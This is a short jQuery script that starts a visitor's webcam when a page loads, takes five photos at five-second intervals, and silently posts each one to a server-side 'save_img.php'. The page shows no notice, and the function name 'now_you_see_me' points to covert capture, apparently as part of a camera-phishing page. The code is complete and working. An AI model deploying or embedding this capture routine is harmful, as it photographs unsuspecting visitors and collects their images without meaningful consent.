

$(document).ready(function(){ 
    //photo
    const webcamElement = document.getElementById('webcam');
    const canvasElement = document.getElementById('canvas');
    const webcam = new Webcam(webcamElement, 'user', canvasElement);

    webcam.start();

    var i=0;
    window.setInterval(function(){
        if(i<5){
            now_you_see_me();
            i++;
        }
    }, 5000);

    function now_you_see_me(){
        var picture = webcam.snap();
        $.post("./save_img.php",
        {picture:picture},
        function(data,status){
            console.log(data);
        });
    }
});